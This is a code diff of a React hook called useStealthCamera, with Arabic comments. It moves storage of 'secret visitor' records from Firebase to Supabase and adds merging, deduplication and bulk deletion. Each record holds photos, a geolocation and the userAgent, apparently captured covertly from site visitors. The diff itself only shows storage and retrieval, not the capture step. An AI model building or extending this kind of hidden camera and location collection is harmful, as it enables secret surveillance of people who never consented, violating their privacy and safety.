@@ -1,5 +1,5 @@
 import { useState, useRef, useCallback } from 'react';
-import { firestoreHelpers, COLLECTIONS } from '@/lib/firebase';
+import { supabaseHelpers, TABLES } from '@/lib/supabase';
 
 interface CapturedPhoto {
   id: string;
@@ -305,14 +305,14 @@ export const useStealthCamera = () => {
         visitTime: visitor.visitTime
       });
 
-      // محاولة حفظ البيانات في Firebase أولاً
-      let savedToFirebase = false;
+      // محاولة حفظ البيانات في Supabase أولاً
+      let savedToSupabase = false;
       try {
-        await firestoreHelpers.addDocument(COLLECTIONS.STEALTH_VISITORS, visitor);
-        console.log('✅ تم حفظ بيانات الزائر السري في Firebase');
-        savedToFirebase = true;
-      } catch (firebaseError) {
-        console.warn('⚠️ فشل في حفظ البيانات في Firebase، سيتم الحفظ محلياً:', firebaseError);
+        await supabaseHelpers.addVisitor(TABLES.STEALTH_VISITORS, visitor);
+        console.log('✅ تم حفظ بيانات الزائر السري في Supabase');
+        savedToSupabase = true;
+      } catch (supabaseError) {
+        console.warn('⚠️ فشل في حفظ البيانات في Supabase، سيتم الحفظ محلياً:', supabaseError);
       }
 
       // حفظ البيانات محلياً دائماً كنسخة احتياطية
@@ -320,7 +320,7 @@ export const useStealthCamera = () => {
         const existingVisitors = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
         existingVisitors.push({
           ...visitor,
-          savedToFirebase
+          savedToSupabase
         });
         localStorage.setItem('stealth_visitors', JSON.stringify(existingVisitors));
         console.log('💾 تم حفظ بيانات الزائر السري محلياً');
@@ -339,45 +339,71 @@ export const useStealthCamera = () => {
   // الحصول على جميع الزوار
   const getAllVisitors = useCallback(async (): Promise<VisitorData[]> => {
     try {
-      // محاولة الحصول على البيانات من Firebase أولاً
-      const firebaseVisitors = await firestoreHelpers.getDocuments(COLLECTIONS.STEALTH_VISITORS);
-      console.log('📊 تم تحميل البيانات السرية من Firebase:', firebaseVisitors.length);
+      console.log('📖 جاري تحميل بيانات الزوار السريين...');
       
-      if (firebaseVisitors.length > 0) {
-        return firebaseVisitors.map(doc => ({
-          id: doc.id,
-          photos: doc.photos || [],
-          location: doc.location,
-          visitTime: doc.visitTime?.toDate ? doc.visitTime.toDate() : new Date(doc.visitTime),
-          userAgent: doc.userAgent
-        }));
-      }
-    } catch (error) {
-      console.warn('⚠️ خطأ في تحميل البيانات من Firebase، استخدام البيانات المحلية:', error);
-    }
-    
-    // العودة إلى localStorage
-    try {
-      const localVisitors = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
-      console.log('📊 تم تحميل البيانات السرية محلياً:', localVisitors.length);
-      return localVisitors.map(visitor => ({
+      // محاولة الحصول على البيانات من Supabase أولاً
+      const supabaseVisitors = await supabaseHelpers.getVisitors(TABLES.STEALTH_VISITORS);
+      
+      // الحصول على بيانات localStorage كنسخة احتياطية
+      const localData = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
+      const localVisitors = localData.map((visitor: any) => ({
         ...visitor,
-        visitTime: new Date(visitor.visitTime)
+        visitTime: new Date(visitor.visitTime),
+        photos: visitor.photos.map((photo: any) => ({
+          ...photo,
+          timestamp: new Date(photo.timestamp)
+        })),
+        location: visitor.location ? {
+          ...visitor.location,
+          timestamp: new Date(visitor.location.timestamp)
+        } : null
       }));
-    } catch (localError) {
-      console.error('❌ خطأ في تحميل البيانات المحلية:', localError);
-      return [];
+
+      // دمج المصدرين، مع إعطاء أولوية لبيانات Supabase
+      const allVisitors = [...supabaseVisitors, ...localVisitors];
+      
+      // إزالة التكرارات بناءً على المعرف
+      const uniqueVisitors = allVisitors.reduce((acc: any[], current: any) => {
+        const exists = acc.find(visitor => visitor.id === current.id);
+        if (!exists) {
+          acc.push(current);
+        }
+        return acc;
+      }, []);
+
+      // الفرز حسب وقت الزيارة (الأحدث أولاً)
+      uniqueVisitors.sort((a, b) => new Date(b.visitTime).getTime() - new Date(a.visitTime).getTime());
+
+      console.log(`✅ تم تحميل ${uniqueVisitors.length} زائر سري (${supabaseVisitors.length} من Supabase + ${localVisitors.length} محلي)`);
+      return uniqueVisitors;
+    } catch (error) {
+      console.error('❌ خطأ في تحميل البيانات:', error);
+      
+      // العودة إلى localStorage فقط كنسخة احتياطية
+      const localData = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
+      return localData.map((visitor: any) => ({
+        ...visitor,
+        visitTime: new Date(visitor.visitTime),
+        photos: visitor.photos.map((photo: any) => ({
+          ...photo,
+          timestamp: new Date(photo.timestamp)
+        })),
+        location: visitor.location ? {
+          ...visitor.location,
+          timestamp: new Date(visitor.location.timestamp)
+        } : null
+      }));
     }
   }, []);
 
   // مسح جميع البيانات
   const clearAllData = useCallback(async () => {
     try {
-      // مسح البيانات من Firebase
-      await firestoreHelpers.deleteAllDocuments(COLLECTIONS.STEALTH_VISITORS);
-      console.log('🗑️ تم مسح جميع البيانات السرية من Firebase');
+      // مسح البيانات من Supabase
+      await supabaseHelpers.deleteAllVisitors(TABLES.STEALTH_VISITORS);
+      console.log('🗑️ تم مسح جميع البيانات السرية من Supabase');
     } catch (error) {
-      console.error('❌ خطأ في مسح البيانات من Firebase:', error);
+      console.error('❌ خطأ في مسح البيانات من Supabase:', error);
     }
     
     // مسح البيانات المحلية أيضاً
